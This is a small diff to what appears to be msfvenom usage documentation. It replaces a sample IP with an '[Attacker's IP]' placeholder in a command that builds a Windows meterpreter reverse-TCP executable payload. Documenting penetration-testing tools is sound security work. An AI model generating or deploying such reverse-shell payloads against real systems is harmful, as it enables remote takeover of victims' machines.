@@ -57,7 +57,7 @@ To see what formats are supported, you can do the following to find out:
 Typically, this is probably how you will use msfvenom:
 
 ```
-$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.64 lport=4444 -f exe -o /tmp/my_payload.exe
+$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
 ```
 
 
